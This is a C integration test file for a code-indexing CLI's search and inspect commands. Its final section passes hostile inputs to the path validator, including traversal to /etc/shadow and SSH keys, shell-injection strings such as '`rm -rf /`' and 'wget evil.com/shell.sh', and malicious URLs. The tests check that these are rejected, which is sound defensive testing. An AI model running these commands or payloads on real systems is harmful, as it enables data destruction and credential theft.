/*
 * test_int_commands.c -- Integration tests for Phase 9: Search + Inspect commands.
 *
 * Creates a temporary project with source files, indexes it,
 * then tests search:symbols, search:text, inspect:outline,
 * inspect:symbol, inspect:file, and inspect:tree.
 *
 * Converted from legacy test_commands.c to test_framework.h format.
 */

#include "test_framework.h"
#include "test_helpers.h"

#include "cmd_search.h"
#include "cmd_inspect.h"
#include "cmd_index.h"
#include "cmd_manage.h"
#include "cmd_suggest.h"
#include "cli.h"
#include "json_output.h"
#include "error.h"
#include "platform.h"
#include "database.h"
#include "index_store.h"
#include "str_util.h"

#include <cJSON.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* ---- Test fixture ---- */

static char *test_dir = NULL;

static void setup_fixture(void)
{
    test_dir = tt_test_tmpdir();
    if (!test_dir) {
        fprintf(stderr, "  FATAL: tt_test_tmpdir() returned NULL\n");
        return;
    }

    /* Create source files */
    const char *php_content =
        "<?php\n"
        "\n"
        "namespace App;\n"
        "\n"
        "/**\n"
        " * Authentication handler.\n"
        " */\n"
        "class Auth\n"
        "{\n"
        "    /** Login a user. */\n"
        "    public function login(string $user, string $pass): bool\n"
        "    {\n"
        "        return true;\n"
        "    }\n"
        "\n"
        "    public function logout(): void\n"
        "    {\n"
        "    }\n"
        "}\n";
    tt_test_write_file(test_dir, "src/Auth.php", php_content);

    const char *js_content =
        "/**\n"
        " * Calculate the sum.\n"
        " */\n"
        "function calculateSum(a, b) {\n"
        "    return a + b;\n"
        "}\n"
        "\n"
        "function validateInput(input) {\n"
        "    return input !== null;\n"
        "}\n"
        "\n"
        "// TODO: add more utils\n"
        "const MAX_RETRIES = 3;\n";
    tt_test_write_file(test_dir, "src/utils.js", js_content);

    const char *py_content =
        "\"\"\"Cache module.\"\"\"\n"
        "\n"
        "class CacheManager:\n"
        "    \"\"\"Manages caching logic.\"\"\"\n"
        "\n"
        "    def get(self, key):\n"
        "        \"\"\"Get value by key.\"\"\"\n"
        "        return None\n"
        "\n"
        "    def set(self, key, value):\n"
        "        \"\"\"Set a cache entry.\"\"\"\n"
        "        pass\n";
    tt_test_write_file(test_dir, "src/cache.py", py_content);

    /* JS file that imports from utils.js — creates import data */
    const char *app_js_content =
        "import { calculateSum } from './utils';\n"
        "const { validateInput } = require('./utils');\n"
        "\n"
        "function runApp() {\n"
        "    return calculateSum(1, 2);\n"
        "}\n";
    tt_test_write_file(test_dir, "src/app.js", app_js_content);
}

static void cleanup_fixture(void)
{
    if (test_dir) {
        tt_test_rmdir(test_dir);
        free(test_dir);
        test_dir = NULL;
    }

    /* Also clean up the index */
    char cmd[600];
    snprintf(cmd, sizeof(cmd), "rm -rf ~/.cache/toktoken/projects/");
    if (system(cmd) != 0) { /* best-effort cleanup */ }
}

static void index_fixture(void)
{
    tt_cli_opts_t opts;
    memset(&opts, 0, sizeof(opts));
    opts.path = test_dir;
    opts.truncate_width = 120;

    cJSON *result = tt_cmd_index_create_exec(&opts);
    if (result) {
        if (cJSON_GetObjectItem(result, "error")) {
            const char *msg = cJSON_GetStringValue(
                cJSON_GetObjectItem(result, "message"));
            fprintf(stderr, "  index:create failed: %s\n", msg ? msg : "unknown");
        }
        cJSON_Delete(result);
    } else {
        fprintf(stderr, "  index:create returned NULL: %s\n", tt_error_get());
    }
}

/* ---- Helper to init opts ---- */

static void init_opts(tt_cli_opts_t *opts)
{
    memset(opts, 0, sizeof(*opts));
    opts->path = test_dir;
    opts->truncate_width = 120;
}

/* ---- search:symbols tests ---- */

TT_TEST(test_int_search_symbols_basic)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"login"};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_search_symbols_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL, "should not have error");

    cJSON *results = cJSON_GetObjectItem(result, "results");
    TT_ASSERT_NOT_NULL(results);
    TT_ASSERT(cJSON_GetArraySize(results) > 0, "should have at least one result");

    /* Check first result has expected fields */
    cJSON *first = cJSON_GetArrayItem(results, 0);
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "id"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "name"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "kind"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "file"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "line"));

    /* Score should NOT be in output */
    TT_ASSERT(cJSON_GetObjectItem(first, "score") == NULL, "should not have score field");
    /* end_line should NOT be in output */
    TT_ASSERT(cJSON_GetObjectItem(first, "end_line") == NULL, "should not have end_line field");

    cJSON_Delete(result);
}

TT_TEST(test_int_search_symbols_count)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"login"};
    opts.positional = pos;
    opts.positional_count = 1;
    opts.count = true;

    cJSON *result = tt_cmd_search_symbols_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *count = cJSON_GetObjectItem(result, "count");
    TT_ASSERT_NOT_NULL(count);
    TT_ASSERT(count->valuedouble > 0, "count should be > 0");

    cJSON *q = cJSON_GetObjectItem(result, "q");
    TT_ASSERT_NOT_NULL(q);

    cJSON_Delete(result);
}

TT_TEST(test_int_search_symbols_compact)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"Auth"};
    opts.positional = pos;
    opts.positional_count = 1;
    opts.compact = true;

    cJSON *result = tt_cmd_search_symbols_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *results = cJSON_GetObjectItem(result, "results");
    TT_ASSERT_NOT_NULL(results);

    if (cJSON_GetArraySize(results) > 0) {
        cJSON *first = cJSON_GetArrayItem(results, 0);
        /* Compact mode: id, name, kind, file, line, byte_length */
        TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "id"));
        TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "name"));
        TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "kind"));
        TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "file"));
        TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "line"));
        /* compact should NOT have qname, sig, summary */
        TT_ASSERT(cJSON_GetObjectItem(first, "qname") == NULL, "compact should not have qname");
        TT_ASSERT(cJSON_GetObjectItem(first, "sig") == NULL, "compact should not have sig");
        TT_ASSERT(cJSON_GetObjectItem(first, "summary") == NULL, "compact should not have summary");
    }

    cJSON_Delete(result);
}

TT_TEST(test_int_search_symbols_no_index)
{
    tt_cli_opts_t opts;
    init_opts(&opts);
    opts.path = "/tmp/nonexistent_project_12345";

    const char *pos[] = {"test"};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_search_symbols_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(result, "error"));

    const char *err = cJSON_GetStringValue(cJSON_GetObjectItem(result, "error"));
    TT_ASSERT_EQ_STR(err, "no_index");

    cJSON_Delete(result);
}

TT_TEST(test_int_search_symbols_kind_filter)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"Auth"};
    opts.positional = pos;
    opts.positional_count = 1;
    opts.kind = "class";

    cJSON *result = tt_cmd_search_symbols_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *results = cJSON_GetObjectItem(result, "results");
    TT_ASSERT_NOT_NULL(results);

    /* All results should be class kind */
    cJSON *item;
    cJSON_ArrayForEach(item, results) {
        const char *kind = cJSON_GetStringValue(cJSON_GetObjectItem(item, "kind"));
        TT_ASSERT(kind && strcmp(kind, "class") == 0, "all results should be class kind");
    }

    cJSON_Delete(result);
}

/* ---- search:text tests ---- */

TT_TEST(test_int_search_text_basic)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"TODO"};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_search_text_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL, "should not have error");

    cJSON *results = cJSON_GetObjectItem(result, "results");
    TT_ASSERT_NOT_NULL(results);
    TT_ASSERT(cJSON_GetArraySize(results) > 0, "should find TODO");

    /* Check result format: f, l, t */
    cJSON *first = cJSON_GetArrayItem(results, 0);
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "f"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "l"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "t"));

    cJSON_Delete(result);
}

TT_TEST(test_int_search_text_empty_query)
{
    tt_cli_opts_t opts;
    init_opts(&opts);
    /* No positional, no --search -> empty query */

    cJSON *result = tt_cmd_search_text_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    const char *err = cJSON_GetStringValue(cJSON_GetObjectItem(result, "error"));
    TT_ASSERT_EQ_STR(err, "empty_query");

    cJSON_Delete(result);
}

TT_TEST(test_int_search_text_count)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"return"};
    opts.positional = pos;
    opts.positional_count = 1;
    opts.count = true;

    cJSON *result = tt_cmd_search_text_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *count = cJSON_GetObjectItem(result, "count");
    TT_ASSERT_NOT_NULL(count);
    TT_ASSERT(count->valuedouble > 0, "count should be > 0");

    cJSON_Delete(result);
}

TT_TEST(test_int_search_text_group_by_file)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"return"};
    opts.positional = pos;
    opts.positional_count = 1;
    opts.group_by = "file";

    cJSON *result = tt_cmd_search_text_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL, "should not have error");

    cJSON *groups = cJSON_GetObjectItem(result, "groups");
    TT_ASSERT_NOT_NULL(groups);
    TT_ASSERT(cJSON_IsObject(groups), "groups should be object");

    cJSON *files = cJSON_GetObjectItem(result, "files");
    TT_ASSERT_NOT_NULL(files);
    TT_ASSERT(files->valuedouble > 0, "files count > 0");

    cJSON *total = cJSON_GetObjectItem(result, "total_hits");
    TT_ASSERT_NOT_NULL(total);

    cJSON_Delete(result);
}

/* ---- inspect:outline tests ---- */

TT_TEST(test_int_inspect_outline_basic)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"src/Auth.php"};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_inspect_outline_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL, "should not have error");

    /* Should have file and symbols */
    cJSON *file = cJSON_GetObjectItem(result, "file");
    TT_ASSERT_NOT_NULL(file);

    cJSON *symbols = cJSON_GetObjectItem(result, "symbols");
    TT_ASSERT_NOT_NULL(symbols);
    TT_ASSERT(cJSON_IsArray(symbols), "symbols should be array");
    TT_ASSERT(cJSON_GetArraySize(symbols) > 0, "should have symbols");

    cJSON_Delete(result);
}

TT_TEST(test_int_inspect_outline_compact)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"src/Auth.php"};
    opts.positional = pos;
    opts.positional_count = 1;
    opts.compact = true;

    cJSON *result = tt_cmd_inspect_outline_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *symbols = cJSON_GetObjectItem(result, "symbols");
    if (symbols && cJSON_GetArraySize(symbols) > 0) {
        cJSON *first = cJSON_GetArrayItem(symbols, 0);
        /* Compact keys: k, n, l */
        TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "k"));
        TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "n"));
        TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(first, "l"));
        /* Should NOT have full names */
        TT_ASSERT(cJSON_GetObjectItem(first, "kind") == NULL, "compact should not have kind");
        TT_ASSERT(cJSON_GetObjectItem(first, "name") == NULL, "compact should not have name");
    }

    cJSON_Delete(result);
}

TT_TEST(test_int_inspect_outline_not_found)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"nonexistent.php"};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_inspect_outline_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    const char *err = cJSON_GetStringValue(cJSON_GetObjectItem(result, "error"));
    TT_ASSERT_EQ_STR(err, "file_not_found");

    cJSON_Delete(result);
}

/* ---- inspect:file tests ---- */

TT_TEST(test_int_inspect_file_basic)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"src/utils.js"};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_inspect_file_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL, "should not have error");

    /* Check format */
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(result, "file"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(result, "total_lines"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(result, "content"));

    cJSON *range = cJSON_GetObjectItem(result, "range");
    TT_ASSERT_NOT_NULL(range);
    TT_ASSERT(cJSON_IsArray(range), "range should be array");
    TT_ASSERT_EQ_INT(cJSON_GetArraySize(range), 2);

    /* Content should contain our fixture */
    const char *content = cJSON_GetStringValue(cJSON_GetObjectItem(result, "content"));
    TT_ASSERT_NOT_NULL(content);
    TT_ASSERT_STR_CONTAINS(content, "calculateSum");

    cJSON_Delete(result);
}

TT_TEST(test_int_inspect_file_line_range)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"src/utils.js"};
    opts.positional = pos;
    opts.positional_count = 1;
    opts.lines = "4-6";

    cJSON *result = tt_cmd_inspect_file_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL, "should not have error");

    cJSON *range = cJSON_GetObjectItem(result, "range");
    cJSON *start = cJSON_GetArrayItem(range, 0);
    cJSON *end = cJSON_GetArrayItem(range, 1);
    TT_ASSERT_EQ_INT((int)start->valuedouble, 4);
    TT_ASSERT_EQ_INT((int)end->valuedouble, 6);

    const char *content = cJSON_GetStringValue(cJSON_GetObjectItem(result, "content"));
    TT_ASSERT_NOT_NULL(content);
    TT_ASSERT_STR_CONTAINS(content, "calculateSum");

    cJSON_Delete(result);
}

TT_TEST(test_int_inspect_file_not_found)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"nonexistent.php"};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_inspect_file_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    const char *err = cJSON_GetStringValue(cJSON_GetObjectItem(result, "error"));
    TT_ASSERT_EQ_STR(err, "file_not_found");

    cJSON_Delete(result);
}

/* ---- inspect:symbol tests ---- */

TT_TEST(test_int_inspect_symbol_basic)
{
    /* First search for a symbol to get its ID */
    tt_cli_opts_t search_opts;
    init_opts(&search_opts);

    const char *spos[] = {"calculateSum"};
    search_opts.positional = spos;
    search_opts.positional_count = 1;

    cJSON *search_result = tt_cmd_search_symbols_exec(&search_opts);
    TT_ASSERT_NOT_NULL(search_result);

    cJSON *results = cJSON_GetObjectItem(search_result, "results");
    if (!results || cJSON_GetArraySize(results) == 0) {
        cJSON_Delete(search_result);
        TT_ASSERT(0, "no symbol found to inspect");
        return;
    }

    cJSON *first = cJSON_GetArrayItem(results, 0);
    const char *symbol_id = cJSON_GetStringValue(cJSON_GetObjectItem(first, "id"));
    TT_ASSERT_NOT_NULL(symbol_id);

    /* Now inspect that symbol */
    tt_cli_opts_t opts;
    init_opts(&opts);
    opts.positional = &symbol_id;
    opts.positional_count = 1;

    int exit_code = 0;
    cJSON *result = tt_cmd_inspect_symbol_exec(&opts, &exit_code);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT_EQ_INT(exit_code, 0);

    /* Single symbol: flat output */
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(result, "source"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(result, "name"));
    TT_ASSERT_NOT_NULL(cJSON_GetObjectItem(result, "kind"));

    const char *source = cJSON_GetStringValue(cJSON_GetObjectItem(result, "source"));
    TT_ASSERT_NOT_NULL(source);
    TT_ASSERT(strlen(source) > 0, "source should not be empty");

    cJSON_Delete(result);
    cJSON_Delete(search_result);
}

TT_TEST(test_int_inspect_symbol_not_found)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {"nonexistent::fake#method"};
    opts.positional = pos;
    opts.positional_count = 1;

    int exit_code = 0;
    cJSON *result = tt_cmd_inspect_symbol_exec(&opts, &exit_code);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT_EQ_INT(exit_code, 1);

    cJSON_Delete(result);
}

TT_TEST(test_int_inspect_symbol_exit_code_2)
{
    /* First get a valid symbol ID */
    tt_cli_opts_t search_opts;
    init_opts(&search_opts);

    const char *spos[] = {"calculateSum"};
    search_opts.positional = spos;
    search_opts.positional_count = 1;

    cJSON *sr = tt_cmd_search_symbols_exec(&search_opts);
    cJSON *results = cJSON_GetObjectItem(sr, "results");
    if (!results || cJSON_GetArraySize(results) == 0) {
        cJSON_Delete(sr);
        TT_ASSERT(0, "no symbol found");
        return;
    }

    const char *valid_id = cJSON_GetStringValue(
        cJSON_GetObjectItem(cJSON_GetArrayItem(results, 0), "id"));

    /* Now inspect with one valid and one invalid ID */
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {NULL, "nonexistent::fake#method"};
    pos[0] = valid_id;
    opts.positional = pos;
    opts.positional_count = 2;

    int exit_code = 0;
    cJSON *result = tt_cmd_inspect_symbol_exec(&opts, &exit_code);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT_EQ_INT(exit_code, 2);

    /* Should have both symbols and errors */
    cJSON *symbols = cJSON_GetObjectItem(result, "symbols");
    cJSON *errors = cJSON_GetObjectItem(result, "errors");
    TT_ASSERT_NOT_NULL(symbols);
    TT_ASSERT_NOT_NULL(errors);
    TT_ASSERT(cJSON_GetArraySize(symbols) > 0, "should have found symbols");
    TT_ASSERT(cJSON_GetArraySize(errors) > 0, "should have error entries");

    cJSON_Delete(result);
    cJSON_Delete(sr);
}

/* ---- inspect:tree tests ---- */

TT_TEST(test_int_inspect_tree_basic)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    cJSON *result = tt_cmd_inspect_tree_exec(&opts);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT(cJSON_GetObjectItem(result, "error") == NULL, "should not have error");

    cJSON *tree = cJSON_GetObjectItem(result, "tree");
    TT_ASSERT_NOT_NULL(tree);
    TT_ASSERT(cJSON_IsArray(tree), "tree should be array");
    TT_ASSERT(cJSON_GetArraySize(tree) > 0, "tree should have entries");

    cJSON *files = cJSON_GetObjectItem(result, "files");
    TT_ASSERT_NOT_NULL(files);
    TT_ASSERT(files->valuedouble > 0, "files count > 0");

    cJSON_Delete(result);
}

TT_TEST(test_int_inspect_tree_depth)
{
    tt_cli_opts_t opts;
    init_opts(&opts);
    opts.depth = 1;

    cJSON *result = tt_cmd_inspect_tree_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *tree = cJSON_GetObjectItem(result, "tree");
    TT_ASSERT_NOT_NULL(tree);

    /* With depth=1, top-level should have "src" directory */
    bool found_src = false;
    cJSON *item;
    cJSON_ArrayForEach(item, tree) {
        const char *name = cJSON_GetStringValue(cJSON_GetObjectItem(item, "name"));
        if (name && strcmp(name, "src") == 0) {
            found_src = true;
            /* Children should exist (collapsed files) */
            cJSON *children = cJSON_GetObjectItem(item, "children");
            TT_ASSERT_NOT_NULL(children);
        }
    }
    TT_ASSERT(found_src, "should find src directory");

    cJSON_Delete(result);
}

/* ---- Extreme malicious path tests ---- */

/*
 * Helper: run inspect:outline with a malicious path and assert it returns
 * either "invalid_path" or "file_not_found" (never crashes, never leaks data).
 */
static void assert_outline_rejects(const char *evil_path)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {evil_path};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_inspect_outline_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    const char *err = cJSON_GetStringValue(cJSON_GetObjectItem(result, "error"));
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT(strcmp(err, "invalid_path") == 0 || strcmp(err, "file_not_found") == 0,
              "outline should reject evil path with invalid_path or file_not_found");

    cJSON_Delete(result);
}

/*
 * Helper: run inspect:file with a malicious path and assert it returns
 * either "invalid_path" or "file_not_found".
 */
static void assert_file_rejects(const char *evil_path)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {evil_path};
    opts.positional = pos;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_inspect_file_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    const char *err = cJSON_GetStringValue(cJSON_GetObjectItem(result, "error"));
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT(strcmp(err, "invalid_path") == 0 || strcmp(err, "file_not_found") == 0,
              "file should reject evil path with invalid_path or file_not_found");

    cJSON_Delete(result);
}

/*
 * Helper: run inspect:symbol with a malicious symbol ID and assert it
 * returns a non-NULL result without crashing (exit_code != 0).
 */
static void assert_symbol_rejects(const char *evil_id)
{
    tt_cli_opts_t opts;
    init_opts(&opts);

    const char *pos[] = {evil_id};
    opts.positional = pos;
    opts.positional_count = 1;

    int exit_code = 0;
    cJSON *result = tt_cmd_inspect_symbol_exec(&opts, &exit_code);
    TT_ASSERT_NOT_NULL(result);
    TT_ASSERT(exit_code != 0, "symbol should reject evil ID with non-zero exit");

    cJSON_Delete(result);
}

TT_TEST(test_int_evil_path_traversal)
{
    /* Classic traversal patterns */
    assert_outline_rejects("../etc/passwd");
    assert_outline_rejects("../../etc/passwd");
    assert_outline_rejects("src/../../../etc/passwd");
    assert_outline_rejects("src/../../etc/shadow");
    assert_file_rejects("../etc/passwd");
    assert_file_rejects("../../etc/passwd");
    assert_file_rejects("src/../../../etc/passwd");

    /* Windows-style backslash traversal */
    assert_outline_rejects("..\\..\\etc\\passwd");
    assert_file_rejects("..\\Windows\\System32\\config\\SAM");

    /* Mixed separators */
    assert_outline_rejects("../..\\etc/passwd");
    assert_file_rejects("src\\..\\..\\etc\\passwd");

    /* Double-encoded dot-dot (literal string, not URL-decoded) */
    assert_outline_rejects("..%2f..%2fetc%2fpasswd");
    assert_file_rejects("%2e%2e/%2e%2e/etc/passwd");
}

TT_TEST(test_int_evil_path_absolute)
{
    /* Unix absolute paths */
    assert_outline_rejects("/etc/passwd");
    assert_outline_rejects("/tmp/evil");
    assert_outline_rejects("/dev/null");
    assert_outline_rejects("/proc/self/environ");
    assert_file_rejects("/etc/shadow");
    assert_file_rejects("/root/.ssh/id_rsa");
    assert_file_rejects("/dev/urandom");

    /* Windows absolute paths */
    assert_outline_rejects("C:\\Windows\\System32\\cmd.exe");
    assert_file_rejects("C:\\Users\\admin\\Desktop\\secrets.txt");

    /* UNC paths */
    assert_outline_rejects("\\\\evil-server\\share\\payload");
    assert_file_rejects("\\\\127.0.0.1\\c$\\Windows\\System32");
}

TT_TEST(test_int_evil_path_null_bytes)
{
    /*
     * C strings terminate at null byte, so "\x00" is empty string and
     * "src/file\x00.php" is just "src/file". The validator handles these
     * as regular strings (empty → invalid_path, truncated → file_not_found).
     * The key guarantee: no crash, no arbitrary file access.
     */
    /* Empty string (null byte only) → missing_argument (caught before normalize_path) */
    {
        tt_cli_opts_t opts;
        init_opts(&opts);
        const char *pos[] = {"\x00"};
        opts.positional = pos;
        opts.positional_count = 1;
        cJSON *result = tt_cmd_inspect_outline_exec(&opts);
        TT_ASSERT_NOT_NULL(result);
        const char *err = cJSON_GetStringValue(cJSON_GetObjectItem(result, "error"));
        TT_ASSERT_EQ_STR(err, "missing_argument");
        cJSON_Delete(result);
    }

    /* Truncated paths: C sees "src/file", "src/auth", "src" */
    {
        tt_cli_opts_t opts;
        init_opts(&opts);
        const char *pos[] = {"src/file\x00.php"};
        opts.positional = pos;
        opts.positional_count = 1;
        cJSON *result = tt_cmd_inspect_outline_exec(&opts);
        TT_ASSERT_NOT_NULL(result);
        /* Must not crash; error is acceptable */
        cJSON_Delete(result);
    }
    {
        tt_cli_opts_t opts;
        init_opts(&opts);
        const char *pos[] = {"src/auth\x00../../etc/passwd"};
        opts.positional = pos;
        opts.positional_count = 1;
        cJSON *result = tt_cmd_inspect_file_exec(&opts);
        TT_ASSERT_NOT_NULL(result);
        cJSON_Delete(result);
    }
    {
        tt_cli_opts_t opts;
        init_opts(&opts);
        const char *pos[] = {"src\x00/\x00evil"};
        opts.positional = pos;
        opts.positional_count = 1;
        cJSON *result = tt_cmd_inspect_file_exec(&opts);
        TT_ASSERT_NOT_NULL(result);
        cJSON_Delete(result);
    }
}

TT_TEST(test_int_evil_path_shell_injection)
{
    /* Command substitution */
    assert_outline_rejects("$(whoami)");
    assert_outline_rejects("$(cat /etc/passwd)");
    assert_file_rejects("`id`");
    assert_file_rejects("`rm -rf /`");

    /* Shell metacharacters */
    assert_outline_rejects("src/; rm -rf /");
    assert_outline_rejects("src/| cat /etc/passwd");
    assert_file_rejects("src && curl evil.com");
    assert_file_rejects("src || wget evil.com/shell.sh");

    /* Pipe and redirect */
    assert_outline_rejects("src > /tmp/pwned");
    assert_file_rejects("src < /dev/urandom");
    assert_file_rejects("src >> /tmp/append");

    /* Semicolons and newlines */
    assert_outline_rejects("file.php; cat /etc/passwd");
    assert_file_rejects("file.php\ncat /etc/passwd");
    assert_file_rejects("file.php\r\nwhoami");
}

TT_TEST(test_int_evil_path_special_chars)
{
    /* Whitespace-only */
    assert_outline_rejects(" ");
    assert_outline_rejects("   ");
    assert_outline_rejects("\t");
    assert_outline_rejects("\t\t\t");
    assert_file_rejects(" ");
    assert_file_rejects("\n");
    assert_file_rejects("\r\n");

    /* Dot paths */
    assert_outline_rejects(".");
    assert_outline_rejects("..");
    assert_outline_rejects("...");
    assert_file_rejects(".");
    assert_file_rejects("..");

    /* Paths ending with dot/space (Windows edge cases) */
    assert_outline_rejects("src/file. ");
    assert_file_rejects("src/file.");

    /* Tilde expansion */
    assert_outline_rejects("~/../../etc/passwd");
    assert_file_rejects("~root/.ssh/id_rsa");
}

TT_TEST(test_int_evil_path_long)
{
    /* Extremely long path (4096+ chars to exceed PATH_MAX) */
    char long_path[5000];
    memset(long_path, 'A', sizeof(long_path) - 1);
    long_path[sizeof(long_path) - 1] = '\0';
    assert_outline_rejects(long_path);
    assert_file_rejects(long_path);

    /* Long path with traversal buried deep */
    memset(long_path, 'x', 2000);
    long_path[2000] = '/';
    long_path[2001] = '.';
    long_path[2002] = '.';
    long_path[2003] = '/';
    memset(long_path + 2004, 'y', 1000);
    long_path[3004] = '\0';
    assert_outline_rejects(long_path);
    assert_file_rejects(long_path);

    /* Many nested directories */
    char nested[4096];
    int pos = 0;
    for (int i = 0; i < 500 && pos < 4090; i++) {
        nested[pos++] = 'a';
        nested[pos++] = '/';
    }
    nested[pos] = '\0';
    assert_outline_rejects(nested);
    assert_file_rejects(nested);
}

TT_TEST(test_int_evil_path_unicode)
{
    /* Unicode path components */
    assert_outline_rejects("\xe4\xb8\xad\xe6\x96\x87/file.py");  /* Chinese chars */
    assert_file_rejects("\xf0\x9f\x94\xa5/payload.py");            /* Fire emoji */
    assert_outline_rejects("\xf0\x9f\x92\x80.php");               /* Skull emoji */

    /* Homoglyph attack: Cyrillic 'а' instead of Latin 'a' */
    assert_outline_rejects("src/\xd0\xb0uth.php");

    /* Unicode null (U+0000 as UTF-8 overlong encoding) */
    assert_outline_rejects("src/\xc0\x80" "evil.php");

    /* Right-to-left override (U+202E) */
    assert_outline_rejects("src/\xe2\x80\xaetxt.php");

    /* Zero-width space (U+200B) */
    assert_outline_rejects("src/\xe2\x80\x8b" "file.php");
}

TT_TEST(test_int_evil_path_proto_device)
{
    /* Protocol handlers */
    assert_outline_rejects("file:///etc/passwd");
    assert_file_rejects("file:///etc/shadow");
    assert_outline_rejects("http://evil.com/shell.php");
    assert_file_rejects("ftp://evil.com/malware.exe");
    assert_outline_rejects("data:text/html,<script>alert(1)</script>");

    /* Device files (Unix) */
    assert_file_rejects("/dev/null");
    assert_file_rejects("/dev/zero");
    assert_file_rejects("/dev/random");

    /* Proc/sys filesystem */
    assert_file_rejects("/proc/self/cmdline");
    assert_file_rejects("/proc/1/environ");
    assert_file_rejects("/sys/class/net/eth0/address");
}

TT_TEST(test_int_evil_symbol_id)
{
    /* Path traversal in symbol IDs */
    assert_symbol_rejects("../../../etc/passwd::evil#function");
    assert_symbol_rejects("/etc/passwd::root#class");

    /* Shell injection in symbol IDs */
    assert_symbol_rejects("$(whoami)::evil#function");
    assert_symbol_rejects("`id`::evil#function");
    assert_symbol_rejects("src/file.php; rm -rf /::evil#function");

    /* Null bytes */
    assert_symbol_rejects("src/file\x00::evil#function");

    /* Extremely long symbol ID */
    char long_id[5000];
    memset(long_id, 'Z', 4990);
    long_id[4990] = ':';
    long_id[4991] = ':';
    long_id[4992] = 'x';
    long_id[4993] = '#';
    long_id[4994] = 'y';
    long_id[4995] = '\0';
    assert_symbol_rejects(long_id);

    /* Empty/degenerate symbol IDs */
    assert_symbol_rejects("");
    assert_symbol_rejects("::");
    assert_symbol_rejects("#");
    assert_symbol_rejects("::##");
    assert_symbol_rejects("   ");
}

/* ---- Query length limit tests ---- */

